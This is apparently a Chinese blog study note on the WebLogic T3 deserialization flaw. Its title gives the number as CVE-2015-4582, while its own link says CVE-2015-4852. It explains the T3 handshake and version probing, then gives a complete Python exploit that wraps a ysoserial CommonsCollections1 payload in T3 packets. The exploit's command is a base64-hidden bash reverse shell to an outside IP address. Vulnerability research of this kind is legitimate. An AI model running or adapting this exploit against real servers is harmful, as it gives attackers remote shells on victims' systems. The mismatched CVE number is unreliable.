# CVE-2015-4582

## 影响

1. 10.3.6.0
2. 12.1.2.0
3. 12.1.3.0
4. 12.2.1.0

## 漏洞分析

看了一些文章其实漏洞原理其实挺简单的....总结来说就是：weblogci通过T3协议进行传递序列化数据没有经过任何过滤并且weblogic恰好存在恶意利用链的jar包，相当于提供了一个`source`。

那什么是T3协议？

## T3协议（碰到的问题）

问题1：为什么wireshark抓包无法抓到数据包？(其实也就是基础问题)
开始的时候一直没有抓到包....搜了很多文章看
包括一些wireshark为什么抓不到baidu的包？不是没抓到是因为https加密了：[为什么你抓不到baidu的数据](https://mp.weixin.qq.com/s?__biz=MzUzNTY5MzU2MA==&mid=2247497288&idx=1&sn=1d634021528643c2f71e7cbf4dd7a0f7&chksm=fa8327dfcdf4aec9f798046e38ed5918d2df937c1ba7b7729c08e31b4c5c23cd13023c1c08f6&mpshare=1&scene=23&srcid=0110jBzdFMNuglOyMZh5teWu&sharer_sharetime=1673322185390&sharer_shareid=33fdea7abe6be586e131951d667ccd06#rd)
后来去上了个厕所回来，突然想到会不会是网卡的问题(我这又不是通过WIFI访问的docker环境!!!!).....豁然开朗，于是秒速更换VMware Network Adapter VMnet8的网卡.

问题2：什么是T3协议？
分为两部分：非java序列化数据（请求头部分）
这部分能干嘛？（个人觉得可以进行版本探测：[前人经验：使用`t3 9.2.0\nAS:255\nHL:19\n\n`字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法](https://y4er.com/posts/weblogic-cve-2015-4852/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)）

因为再建立tcp链接的时候会进行响应有对应版本的回显：

```python
import socket

def T3Test(ip,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    handshake = "t3 9.2.0\nAS:255\nHL:19\n\n" #请求包的头
    sock.sendall(handshake.encode())
    while True:
        data = sock.recv(1024)
        print(data.decode())

if __name__ == "__main__":
    ip = "192.168.88.128"
    port = 7001

    T3Test(ip,port)
```

后一部分就是序列化的数据。
[这篇文章讲述的更加详细对于T3协议（从代码层面）](https://zhuanlan.zhihu.com/p/512057410)【这里相当于跟了一遍流程】

`t3 9.2.0\nAS:255\nHL:19\n\n`

AS：如果长度大于256（反序列化对象大小）则不会进行反序列化（同时这也是payload中desflag设置得原因，还有需要typecode为0....其实文章说的很清楚）
让我好奇得是前人是怎么构造出这种16进制数据呢？可能就像y4er师傅那样找一个样本，然后修改相应部分就行了.（就没有动手啦~嘿嘿）

## payload

```python
from os import popen
import struct  # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii


def generatePayload(gadget, cmd):
    YSO_PATH = "C:\\Users\\18282\\Desktop\\Tools\\ysoserial-0.0.6-SNAPSHOT-all.jar"
    popen = subprocess.Popen(['java', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)
    return popen.stdout.read()


def T3Exploit(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    data += sock.recv(1024)
    compile = re.compile("HELO:(.*).0.false")
    print(data.decode())
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: " + "".join(match))
    else:
        print("Not Weblogic")
        return
    header = binascii.a2b_hex(b"00000000")
    print(header)
    t3header = binascii.a2b_hex(
        b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    print(t3header)
    desflag = binascii.a2b_hex(b"fe010000")
    print(desflag)
    payload = header+t3header + desflag + payload #整合payload
    print(payload)
    payload = struct.pack(">I", len(payload)) + payload[4:]
    sock.send(payload)


if __name__ == "__main__":
    ip = "192.168.88.128"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDguMjIzLjkxLzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"
    payload = generatePayload(gadget, cmd)
    T3Exploit(ip, port, payload)



# import socket
#
# def T3Test(ip,port):
#     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     sock.connect((ip, port))
#     handshake = "t3 9.2.0\nAS:255\nHL:19\n\n" #请求包的头
#     sock.sendall(handshake.encode())
#     while True:
#         data = sock.recv(1024)
#         print(data.decode())
#
# if __name__ == "__main__":
#     ip = "192.168.88.128"
#     port = 7001
#
#     T3Test(ip,port)

```

## 修复
https://tttang.com/archive/1768/#toc__6 （黑名单的形式）
